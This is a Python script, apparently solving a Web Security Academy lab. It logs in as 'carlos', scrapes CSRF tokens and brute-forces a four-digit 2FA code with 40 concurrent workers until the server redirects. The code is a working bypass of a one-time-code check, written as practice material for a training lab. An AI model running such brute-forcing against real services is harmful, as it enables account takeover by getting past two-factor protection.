from web_security_academy.core.async_lab_session import AsyncLabSession
from web_security_academy.core.logger import logger, NoNewline
from bs4 import BeautifulSoup

import asyncio
import sys


def solve_lab(session):
    # Todo: Error handling
    asyncio.run(solve_lab_async(session))


async def solve_lab_async(session):
    logger.info("Attempting to brute-force Carlos's 2FA verification code...")

    # Populate work queue
    queue = asyncio.Queue()
    for i in range(2000):
        queue.put_nowait(i)

    with NoNewline():
        # Create worker tasks to process the queue concurrently
        num_workers = 40
        tasks = []
        for i in range(num_workers):
            await asyncio.sleep(4 / num_workers)
            task = asyncio.create_task(worker(session, queue))
            tasks.append(task)

        await queue.join()

    # Cancel our worker task
    for task in tasks:
        task.cancel()
    await asyncio.gather(*tasks, return_exceptions=True)


async def worker(session, queue):
    while True:
        n = await queue.get()
        await try_mfa_code(queue, session, n)
        if not queue.empty():
            queue.task_done()


async def try_mfa_code(queue, session, n):
    async with AsyncLabSession(session) as session:
        # Logging in as Carlos
        resp = await session.get_path("/login")
        soup = BeautifulSoup(resp.text, "html.parser")
        csrf = soup.select_one('input[name="csrf"]').get("value")
        data = {"csrf": csrf, "username": "carlos", "password": "montoya"}
        resp = await session.post_path("/login", data=data, follow_redirects=True)

        # Try 2FA code
        soup = BeautifulSoup(resp.text, "html.parser")
        csrf = soup.select_one('input[name="csrf"]').get("value")
        data = {"csrf": csrf, "mfa-code": f"{n:04d}"}
        resp = await session.post_path("/login2", data=data)

        if resp.status_code != 302:
            if not queue.empty():
                logger.info(f"{n:04d} => Incorrect")
        else:
            await session.get_path(resp.headers["Location"])
            logger.success(f"{n:04d} => Correct!")
            while queue.qsize() > 1:
                queue.task_done()
